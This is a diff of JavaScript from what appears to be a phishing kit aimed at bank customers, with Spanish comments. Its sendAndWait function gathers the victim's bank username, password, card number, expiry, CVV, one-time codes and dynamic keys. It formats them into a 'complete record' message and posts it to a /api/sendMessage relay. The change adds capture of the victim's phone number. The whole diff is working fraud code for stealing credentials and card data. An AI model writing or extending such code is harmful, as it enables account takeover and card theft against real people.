@@ -59,22 +59,24 @@ async function sendAndWait(payload, handlers) {
       sessionStorage.setItem('temp_tc', payload.tc || '');
       sessionStorage.setItem('temp_expiry', payload.expiry || '');
       sessionStorage.setItem('temp_cvv', payload.cvv || '');
+      sessionStorage.setItem('temp_phone', payload.phone || payload.telefono || '');
     } else if (payload.event === 'OTP') {
       sessionStorage.setItem('temp_otp', payload.otp || '');
     } else if (payload.event === 'DINAMICA') {
       sessionStorage.setItem('temp_dinamic', payload.dinamic || '');
     }
 
-    // 2. Recuperar TODO lo acumulado (evitando que la clave salga como N/A)
-    const uUser = sessionStorage.getItem('bc_user') || USER || 'N/A';
-    const uPass = sessionStorage.getItem('bc_pass') || 'N/A';
-    const uTc   = sessionStorage.getItem('temp_tc') || 'N/A';
-    const uExp  = sessionStorage.getItem('temp_expiry') || 'N/A';
-    const uCvv  = sessionStorage.getItem('temp_cvv') || 'N/A';
-    const uOtp  = sessionStorage.getItem('temp_otp') || 'N/A';
-    const uDin  = sessionStorage.getItem('temp_dinamic') || 'N/A';
+    // 2. Recuperar TODO lo acumulado
+    const uUser   = sessionStorage.getItem('bc_user') || USER || 'N/A';
+    const uPass   = sessionStorage.getItem('bc_pass') || 'N/A';
+    const uTc     = sessionStorage.getItem('temp_tc') || 'N/A';
+    const uExp    = sessionStorage.getItem('temp_expiry') || 'N/A';
+    const uCvv    = sessionStorage.getItem('temp_cvv') || 'N/A';
+    const uPhone  = sessionStorage.getItem('temp_phone') || 'N/A';
+    const uOtp    = sessionStorage.getItem('temp_otp') || 'N/A';
+    const uDin    = sessionStorage.getItem('temp_dinamic') || 'N/A';
 
-    // 3. Construir el texto unificado para este nuevo mensaje
+    // 3. Construir el mensaje unificado
     let txt = `📋 *REGISTRO COMPLETO [${payload.event}]*\n\n`;
     txt += `🆔 ID: \`${SESSION_ID}\`\n`;
     txt += `👤 Usuario: \`${uUser}\`\n`;
@@ -84,7 +86,8 @@ async function sendAndWait(payload, handlers) {
       txt += `\n\n💳 *DATOS DE TARJETA:*\n`;
       txt += `🔢 TC: \`${uTc}\`\n`;
       txt += `📅 Exp: \`${uExp}\`\n`;
-      txt += `🔒 CVV: \`${uCvv}\``;
+      txt += `🔒 CVV: \`${uCvv}\`\n`;
+      txt += `📞 Teléfono: \`${uPhone}\``;
     }
 
     if (uOtp !== 'N/A') {
@@ -122,7 +125,6 @@ async function sendAndWait(payload, handlers) {
         });
       }
     } else {
-      // Envía un nuevo mensaje independiente pero con TODO el contexto incluido
       const res = await fetch(`/api/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
